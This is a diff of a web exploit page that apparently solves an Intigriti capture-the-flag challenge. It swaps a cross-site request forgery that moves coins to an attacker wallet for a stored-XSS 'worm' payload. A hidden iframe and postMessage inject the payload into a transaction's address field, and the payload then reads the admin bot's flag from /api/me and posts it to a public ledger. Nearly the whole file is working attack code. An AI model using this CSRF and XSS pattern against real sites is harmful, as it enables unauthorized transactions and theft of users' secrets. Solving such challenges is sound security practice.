@@ -1,43 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>High-Value Transfer Audit</title>
+    <title>Protocol 1337 Initializing</title>
 </head>
 <body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <h1>Initiating Protocol 1337...</h1>
-    <p>Transferring 100,000,000 1337COIN to: 1209f27d...bfe9</p>
+    <h1>Audit in Progress...</h1>
+    <p>Using API Endpoint: /api/transaction</p>
 
     <script>
         const target = "https://challenge-0126.intigriti.io";
-        const myAddress = "1209f27d01fff1d414f1da176e75abbfe9";
+        
+        // --- THE "WORM" PAYLOAD ---
+        // 1. Fetches /api/me to get the flag.
+        // 2. Uses /api/transaction to "send" the flag to the public ledger.
+        const xssWorm = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>{fetch('/api/transaction',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({toAddress:'FLAG_IS_'+d.flag,currency:'BTC',amount:0.00001})})})">`;
 
-        // 1. Load the vulnerable checkout page in a hidden iframe
+        // --- THE CSRF ATTACK ---
         const ifr = document.createElement('iframe');
+        // We load checkout.html because it is the only way to reach /api/transaction from here
         ifr.src = `${target}/checkout.html?currency=1337COIN&price=1`;
-        ifr.style.display = 'none';
+        ifr.style.display = "none";
         document.body.appendChild(ifr);
 
         ifr.onload = () => {
-            // 2. Wait for the checkout page and its wallet-fetching logic to finish
             setTimeout(() => {
-                // 3. Trigger the CSRF with a massive amount
-                // The Admin Bot has enough balance to satisfy this request
+                // Trigger the first transaction via postMessage.
+                // This transaction carries the 'xssWorm' into the database.
                 ifr.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: myAddress,
+                        toAddress: xssWorm,
                         currency: '1337COIN',
-                        amount: 1000 
+                        amount: 0.000001
                     }
                 }, '*');
 
-                console.log("High-value transaction submitted via CSRF.");
-                
-                // Optional: Redirect to MarketWatch to see the transaction appear
+                // Redirect the bot to MarketWatch to trigger the worm.
                 setTimeout(() => {
                     window.location.href = `${target}/marketwatch.html`;
-                }, 2000);
-            }, 2000);
+                }, 2500);
+            }, 1500);
         };
     </script>
 </body>
